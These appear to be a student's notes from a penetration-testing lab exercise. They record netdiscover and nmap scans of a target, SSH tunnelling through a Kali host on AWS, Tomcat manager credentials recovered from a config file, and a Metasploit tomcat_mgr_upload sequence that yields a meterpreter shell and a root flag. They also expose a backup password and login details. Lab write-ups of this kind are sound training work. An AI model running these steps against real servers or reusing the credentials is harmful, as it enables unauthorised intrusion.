# W1D5 Exercise Notes

Connection command
`ssh -i keyfile.pem kali@ec2-13-40-173-201.eu-west-2.compute.amazonaws.com`

## sExercise 1

Commands executed:

- sudo netdiscover -r 172.16.48.1/16
- sudo netdiscover -r 172.16.48.227/24 -> discovered ssh service
- nmap -sV 172.16.48.1 -> no address found
- nmap -sV 172.16.48.1 -> seems down

⭐️ `sudo nmap -sS -sV -sC -p- 172.16.11.210`

Local IPs Discovered:

- 172.16.0.2
- 172.16.48.1

⭐️ `sudo nmap -sS -sV -sC -p- 172.16.11.210`

22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f2:a6:62:d7:e7:6a:94:be:7b:6b:a5:12:69:2e:fe:d7 (ECDSA)
|_  256 28:e1:0d:04:80:19:be:44:a6:48:73:aa:e8:6a:65:44 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache Tomcat 9.0.53
|_http-title: Apache Tomcat/9.0.53
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

backup zip: @administrator_hi5


## Exercise 2

Commands:
ssh -i keyfile.pem kali@ec2-13-40-173-201.eu-west-2.compute.amazonaws.com -L 8080:172.16.11.210:8080 -L 8081:172.16.11.210:80

ssh -i keyfile.pem kali@ec2-13-40-173-201.eu-west-2.compute.amazonaws.com -L 8080:172.16.48.1:8080 -L 8081:172.16.48.1:80

#AWS global ip: 13.40.173.201

#
<role rolename="manager-gui"/>
<user username="manager" password="melehifokivai" roles="manager-gui"/>

<role rolename="admin-gui"/>
<user username="admin" password="melehifokivai" roles="admin-gui, manager-gui"/>


meterpreter > pwd
/var/spool/cron

## How to access the shell:
```
mfsconsole

use exploit/multi/http/tomcat_mgr_upload
show options

set RHOSTS 172.16.11.210
set RPORT 8080
set HttpUsername admin
set HttpPassword melehifokivai
```

```root.txt
2fdbf8d4f894292361d6c72c8e833a4b```
